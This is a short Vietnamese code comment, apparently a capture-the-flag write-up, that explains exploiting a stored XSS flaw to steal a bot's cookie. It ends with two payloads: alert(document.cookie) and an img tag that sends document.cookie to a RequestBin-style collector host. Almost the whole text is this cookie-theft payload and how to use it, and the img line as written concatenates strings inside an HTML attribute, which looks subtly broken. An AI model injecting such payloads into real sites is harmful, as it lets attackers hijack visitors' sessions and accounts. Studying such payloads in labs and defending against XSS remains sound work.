/*hiểu một cách đơn giản thì web đang bị stored xss, chúng ta sẽ khai thác lấy cookie từ con bot :V
Bây giờ chúng ta sẽ alert cookie ->
cái này sẽ alert cookie của chúng ta, mỗi khi ai đó đi qua sẽ alert cookie của họ :v
Nhưng tui muốn nhận được cái cookie, do nếu chỉ alert như thế thì con bot nó thấy chứ mình không thấy được :v
Hãy dùng requestsbin để nhận cái requests, mỗi khi con bot di chuyển đến, nó sẽ tạo 1 hành động gửi lên requests bin chúng ta một cái GET mothod
tui dùng thẻ img đơn giản vậy thôi, đợi vài phút sẽ thấy cookie

*/
alert(document.cookie)
<img/src='REQUESTSBIN.com/?c='+document.cookie>
